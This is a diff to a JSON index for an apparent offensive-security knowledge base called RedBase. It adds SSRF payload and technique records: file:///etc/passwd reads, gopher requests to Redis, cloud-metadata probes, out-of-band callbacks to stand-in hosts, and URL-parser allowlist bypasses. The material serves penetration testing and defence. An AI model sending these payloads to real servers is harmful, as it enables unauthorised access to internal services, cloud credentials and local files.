@@ -1,6 +1,780 @@
 {
   "index_schema_version": 1,
-  "payloads": [],
+  "payloads": [
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-basic-cloud-metadata-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<metadata-endpoint>/<metadata-path>",
+      "encoding": "none",
+      "expected_behavior": "Substitute the metadata service endpoint and a provider-specific path for\nthe target platform. Behaviour differs by provider and by configuration.\n\nSome providers serve metadata on a link-local address over plain HTTP with\nno additional request requirements. Some require a session token obtained\nvia a separate request before the metadata can be read. Some require a\ncustom request header on every metadata request. Some restrict which paths\nare readable without additional configuration.\n\nA response containing metadata content indicates the fetch reached the\nservice and the request was accepted. A response indicating a token or\nheader requirement indicates the service is present but the payload alone\nis insufficient. A connection refusal or timeout does not establish that\nthe service is absent; it may be firewalled, hosted on a non-default\naddress, or unavailable from the fetch client's network position.\n",
+      "id": "web-server-side-ssrf-basic-cloud-metadata-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Cloud instance metadata service probe",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3927",
+        "https://cwe.mitre.org/data/definitions/918.html",
+        "https://portswigger.net/web-security/ssrf"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "cloud-instance-metadata",
+      "technique_id": "web-server-side-ssrf-basic",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-basic-file-scheme-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "file:///etc/passwd",
+      "encoding": "none",
+      "expected_behavior": "If the HTTP client or URL handler supports the file scheme, the response contains local file contents. Support depends entirely on the client library; most modern HTTP clients reject the scheme by default.",
+      "id": "web-server-side-ssrf-basic-file-scheme-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "file scheme local read",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/918.html",
+        "https://www.rfc-editor.org/rfc/rfc8089"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-basic",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-basic-gopher-redis-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "gopher://<ip>:6379/_PING%0D%0A",
+      "encoding": "percent-encoded",
+      "expected_behavior": "Substitute the address and port of the line-oriented service under test. Where the client supports the gopher scheme, the request delivers the decoded bytes to the target port, permitting interaction with protocols that accept commands without framing. The response is returned only if the client surfaces gopher replies.",
+      "id": "web-server-side-ssrf-basic-gopher-redis-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "gopher scheme single-command interaction",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc1436",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-basic",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-basic-loopback-http-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<ip>:80/",
+      "encoding": "none",
+      "expected_behavior": "Substitute a loopback address. A response body from that interface, or an error distinguishable from an unreachable-host error, indicates the fetch reached a local service. Absence of a body does not rule out execution; the response may be discarded.",
+      "id": "web-server-side-ssrf-basic-loopback-http-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Loopback HTTP service probe",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/918.html",
+        "https://portswigger.net/web-security/ssrf"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-basic",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-basic-rfc1918-http-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<ip>/",
+      "encoding": "none",
+      "expected_behavior": "Substitute an address in a private range. A response from that address indicates the server can reach an internal network segment. Vary the substituted address across private ranges and compare responses to distinguish reachable from unreachable destinations.",
+      "id": "web-server-side-ssrf-basic-rfc1918-http-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Private range HTTP probe",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc1918",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-basic",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-blind-dns-callback-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<unique-identifier>.dns.example/",
+      "encoding": "none",
+      "expected_behavior": "An authoritative nameserver under tester control records a resolution for the unique identifier. This confirms name resolution occurred. It does not by itself prove a connection was established, a request was sent, or a response was accepted. Where an HTTP callback is also available, prefer it.",
+      "id": "web-server-side-ssrf-blind-dns-callback-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "DNS-only out-of-band callback",
+      "references": [
+        "https://portswigger.net/web-security/ssrf/blind",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-blind-http-callback-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<unique-identifier>.oob.example/",
+      "encoding": "none",
+      "expected_behavior": "The listener receives an HTTP request from the target server. The request method, path, headers, and source address confirm the fetch executed and identify the network position it originated from. Use a distinct identifier per injection point.",
+      "id": "web-server-side-ssrf-blind-http-callback-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "HTTP out-of-band callback",
+      "references": [
+        "https://portswigger.net/web-security/ssrf/blind",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-blind-internal-port-probe-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<ip>:<port>/",
+      "encoding": "none",
+      "expected_behavior": "Substitute the address and port under test. Response times differ between a port that accepts a connection and one that refuses immediately. Repeated measurements per port are required; single samples produce false positives from network noise. This is a semi-blind variant — the application does not return the destination's response, but timing leaks whether the connection was accepted.",
+      "id": "web-server-side-ssrf-blind-internal-port-probe-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Internal port reachability by timing",
+      "references": [
+        "https://portswigger.net/web-security/ssrf/blind",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-blind-webhook-callback-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<callback-host>/",
+      "encoding": "none",
+      "expected_behavior": "The callback host receives an HTTP request from the target server when the webhook is triggered. The request method, path, headers, and source address reveal the origin network position and confirm the fetch was issued. Use a distinct hostname or path per test.",
+      "id": "web-server-side-ssrf-blind-webhook-callback-001",
+      "injection_context": "webhook-url",
+      "license": "pending-policy-review",
+      "name": "Webhook target under tester control",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/918.html",
+        "https://portswigger.net/web-security/ssrf"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-dns-rebinding-hostname-placeholder-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<rebinding-hostname>/",
+      "encoding": "none",
+      "expected_behavior": "Substitute a hostname whose authoritative nameserver is under tester control\nand configured with a low TTL and alternating answers between an allowed\naddress and a forbidden one.\n\nThe test succeeds if the validator resolves the allowed address and approves\nthe URL, and the fetch client then re-resolves the hostname within the TTL\nwindow and reaches the forbidden address. Success is evidenced by a callback\nor response from the forbidden destination.\n\nThis record documents the shape of the input; the mechanism itself is\ninfrastructure (authoritative nameserver, TTL, alternating records) rather\nthan a string. Many clients pin DNS for the duration of a request, defeating\nthe technique entirely. Treat a single failure as inconclusive.\n",
+      "id": "web-server-side-ssrf-dns-rebinding-hostname-placeholder-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Hostname under authoritative-DNS control",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/918.html",
+        "https://www.rfc-editor.org/rfc/rfc1034",
+        "https://www.rfc-editor.org/rfc/rfc1035"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "dns",
+      "technique_id": "web-server-side-ssrf-dns-rebinding",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-backslash-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://expected.example.com\\@<ip>/",
+      "encoding": "none",
+      "expected_behavior": "This is an implementation-specific parser test, not a universally reliable host-confusion payload. URL parsers differ in how they handle backslashes in authority positions. Compare the parsed scheme, authority, hostname, and final network destination in the exact validation and fetch components. Do not assume that the backslash is normalized or treated as a path separator.",
+      "id": "web-server-side-ssrf-parser-backslash-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Backslash in authority position",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-decimal-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<ip-decimal>/",
+      "encoding": "none",
+      "expected_behavior": "Substitute the target IPv4 address expressed as a single 32-bit unsigned integer in decimal. Whether the client accepts this form depends on its host parser; some clients resolve it, others reject it. Validators that require a dotted-quad string will not recognise the value as a host.",
+      "id": "web-server-side-ssrf-parser-decimal-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Decimal-encoded IPv4 host",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": "web-server-side-ssrf-parser-octal-001",
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-hex-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<ip-hex>/",
+      "encoding": "none",
+      "expected_behavior": "Substitute the target IPv4 address with each of its four octets expressed in hexadecimal and prefixed with 0x, joined by dots. Acceptance depends on the client's host parser. Many language HTTP clients reject hex components outright; browser and curl behaviour differs.",
+      "id": "web-server-side-ssrf-parser-hex-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Hexadecimal-encoded IPv4 host",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": "web-server-side-ssrf-parser-decimal-001",
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-ipv6-mapped-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://[<ipv6-mapped-ip>]/",
+      "encoding": "none",
+      "expected_behavior": "Substitute an IPv4 address expressed in IPv4-mapped IPv6 form. An allowlist or denylist that operates on dotted-quad strings does not recognise the mapped form, while the client may resolve it to the equivalent IPv4 address. Behaviour depends on whether the client and the operating system accept mapped literals.",
+      "id": "web-server-side-ssrf-parser-ipv6-mapped-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "IPv6-mapped IPv4 literal",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc4291",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-octal-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<ip-octal>/",
+      "encoding": "none",
+      "expected_behavior": "Substitute the target IPv4 address with each of its four octets expressed in octal, joined by dots. Validators that parse components as decimal integers, or that require no leading zero, will not recognise the address. Whether the client accepts the form depends on its host parser.",
+      "id": "web-server-side-ssrf-parser-octal-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Octal-encoded IPv4 host",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": "web-server-side-ssrf-parser-decimal-001",
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-protocol-relative-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "//<ip>/",
+      "encoding": "none",
+      "expected_behavior": "A protocol-relative reference inherits its scheme from a base URI. It is not necessarily a complete URL when supplied to a standalone HTTP client. Test only in a context that resolves references against a known base URI, and compare how the validator and fetch client resolve it.",
+      "id": "web-server-side-ssrf-parser-protocol-relative-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Protocol-relative reference",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-short-form-ipv4-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://<short-form-ip>/",
+      "encoding": "none",
+      "expected_behavior": "Some legacy or implementation-specific host parsers accept IPv4 addresses with fewer than four components. The interpretation is parser-dependent: the final component may represent the remaining address bits, rather than the omitted components simply being padded with zero. RFC 3986 does not establish universal acceptance of these forms. Test against the exact validator and fetch client in scope.",
+      "id": "web-server-side-ssrf-parser-short-form-ipv4-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Short-form IPv4 host",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-parser-userinfo-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "http://expected.example.com@<ip>/",
+      "encoding": "none",
+      "expected_behavior": "A validator that extracts the host by substring or by splitting before the first slash sees expected.example.com; a client that follows RFC 3986 connects to the substituted address and sends expected.example.com as userinfo. A canary listener distinguishes which component was actually used.",
+      "id": "web-server-side-ssrf-parser-userinfo-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Authority ambiguity via userinfo component",
+      "references": [
+        "https://www.rfc-editor.org/rfc/rfc3986",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-parser-confusion",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/server-side/ssrf/web-server-side-ssrf-redirect-validation-http-3xx-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "https://attacker.example.com/redirect?url=http://<ip>/",
+      "encoding": "none",
+      "expected_behavior": "The first request is sent to a permitted host under tester control. That host\nresponds with a 3xx status and a Location header pointing at the substituted\ninternal destination.\n\nWhether this is exploitable depends on three properties of the fetch client:\n\n- whether it follows redirects at all;\n- whether it re-validates the destination of the redirect against the same\n  policy applied to the original URL;\n- whether it preserves properties the policy depends on (Host header,\n  scheme) across the redirect.\n\nA successful request to the internal destination — evidenced by a callback,\na response body, a timing difference, or a side effect — indicates the policy\nwas not re-applied after the redirect. Absence of evidence does not disprove\nthe vulnerability; the internal service may have been unreachable from the\nfetch client's network position.\n",
+      "id": "web-server-side-ssrf-redirect-validation-http-3xx-001",
+      "injection_context": "url-parameter",
+      "license": "pending-policy-review",
+      "name": "Redirect to unvalidated internal destination",
+      "references": [
+        "https://portswigger.net/web-security/ssrf",
+        "https://cwe.mitre.org/data/definitions/918.html",
+        "https://www.rfc-editor.org/rfc/rfc9110"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-server-side-ssrf-redirect-validation",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    }
+  ],
   "project": "RedBase",
-  "techniques": []
+  "techniques": [
+    {
+      "_path": "knowledge/web/server-side/ssrf/web-server-side-ssrf-basic.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "server-side",
+      "classification": {
+        "cwe": [
+          "CWE-918"
+        ]
+      },
+      "description": "The server fetches a user-controlled destination and returns the response, allowing the requester to read the contents of internal and link-local services.",
+      "domain": "web",
+      "id": "web-server-side-ssrf-basic",
+      "license": "CC-BY-4.0",
+      "maturity": "core",
+      "name": "Basic Server-Side Request Forgery",
+      "payload_refs": [
+        "web-server-side-ssrf-basic-loopback-http-001",
+        "web-server-side-ssrf-basic-rfc1918-http-001",
+        "web-server-side-ssrf-basic-file-scheme-001",
+        "web-server-side-ssrf-basic-gopher-redis-001",
+        "web-server-side-ssrf-basic-cloud-metadata-001"
+      ],
+      "related_techniques": [
+        "web-server-side-ssrf-blind",
+        "web-server-side-ssrf-parser-confusion",
+        "web-server-side-ssrf-redirect-validation",
+        "web-server-side-ssrf-dns-rebinding"
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "ssrf",
+      "tags": [
+        "ssrf",
+        "url-fetch",
+        "response-visible",
+        "trust-boundary"
+      ]
+    },
+    {
+      "_path": "knowledge/web/server-side/ssrf/web-server-side-ssrf-blind.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "server-side",
+      "classification": {
+        "cwe": [
+          "CWE-918"
+        ]
+      },
+      "description": "The server issues a request to a user-controlled destination but does not return the response, so confirmation requires out-of-band observation, timing analysis, or side-effect detection.",
+      "domain": "web",
+      "id": "web-server-side-ssrf-blind",
+      "license": "CC-BY-4.0",
+      "maturity": "core",
+      "name": "Blind Server-Side Request Forgery",
+      "payload_refs": [
+        "web-server-side-ssrf-blind-http-callback-001",
+        "web-server-side-ssrf-blind-dns-callback-001",
+        "web-server-side-ssrf-blind-internal-port-probe-001",
+        "web-server-side-ssrf-blind-webhook-callback-001"
+      ],
+      "related_techniques": [
+        "web-server-side-ssrf-basic",
+        "web-server-side-ssrf-parser-confusion"
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "ssrf",
+      "tags": [
+        "ssrf",
+        "blind",
+        "semi-blind",
+        "out-of-band",
+        "timing"
+      ]
+    },
+    {
+      "_path": "knowledge/web/server-side/ssrf/web-server-side-ssrf-dns-rebinding.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "server-side",
+      "classification": {
+        "cwe": [
+          "CWE-918",
+          "CWE-367"
+        ]
+      },
+      "description": "The hostname resolves to an allowed address at validation time and to a forbidden address at fetch time, exploiting separate resolutions rather than URL parser disagreement.",
+      "domain": "web",
+      "id": "web-server-side-ssrf-dns-rebinding",
+      "license": "CC-BY-4.0",
+      "maturity": "advanced",
+      "name": "SSRF via DNS Rebinding",
+      "payload_refs": [
+        "web-server-side-ssrf-dns-rebinding-hostname-placeholder-001"
+      ],
+      "related_techniques": [
+        "web-server-side-ssrf-basic",
+        "web-server-side-ssrf-parser-confusion",
+        "web-server-side-ssrf-redirect-validation"
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "ssrf",
+      "tags": [
+        "ssrf",
+        "dns-rebinding",
+        "toctou",
+        "url-fetch"
+      ]
+    },
+    {
+      "_path": "knowledge/web/server-side/ssrf/web-server-side-ssrf-parser-confusion.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "server-side",
+      "classification": {
+        "cwe": [
+          "CWE-918",
+          "CWE-436"
+        ]
+      },
+      "description": "The validator and the fetch client interpret the URL's authority component differently, so a value that appears to target an allowed host resolves to a forbidden destination.",
+      "domain": "web",
+      "id": "web-server-side-ssrf-parser-confusion",
+      "license": "CC-BY-4.0",
+      "maturity": "advanced",
+      "name": "SSRF via URL Parser Confusion",
+      "payload_refs": [
+        "web-server-side-ssrf-parser-userinfo-001",
+        "web-server-side-ssrf-parser-ipv6-mapped-001",
+        "web-server-side-ssrf-parser-decimal-001",
+        "web-server-side-ssrf-parser-octal-001",
+        "web-server-side-ssrf-parser-hex-001",
+        "web-server-side-ssrf-parser-short-form-ipv4-001",
+        "web-server-side-ssrf-parser-backslash-001",
+        "web-server-side-ssrf-parser-protocol-relative-001"
+      ],
+      "related_techniques": [
+        "web-server-side-ssrf-basic",
+        "web-server-side-ssrf-blind",
+        "web-server-side-ssrf-redirect-validation",
+        "web-server-side-ssrf-dns-rebinding"
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "ssrf",
+      "tags": [
+        "ssrf",
+        "parser-differential",
+        "allowlist-bypass",
+        "url-fetch"
+      ]
+    },
+    {
+      "_path": "knowledge/web/server-side/ssrf/web-server-side-ssrf-redirect-validation.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "server-side",
+      "classification": {
+        "cwe": [
+          "CWE-918"
+        ]
+      },
+      "description": "A permitted destination returns a redirect to an unvalidated internal destination, and the fetch client follows it without re-applying the policy.",
+      "domain": "web",
+      "id": "web-server-side-ssrf-redirect-validation",
+      "license": "CC-BY-4.0",
+      "maturity": "advanced",
+      "name": "SSRF via Redirect Validation Failure",
+      "payload_refs": [
+        "web-server-side-ssrf-redirect-validation-http-3xx-001"
+      ],
+      "related_techniques": [
+        "web-server-side-ssrf-basic",
+        "web-server-side-ssrf-parser-confusion",
+        "web-server-side-ssrf-dns-rebinding"
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "ssrf",
+      "tags": [
+        "ssrf",
+        "redirect",
+        "validation",
+        "url-fetch"
+      ]
+    }
+  ]
 }
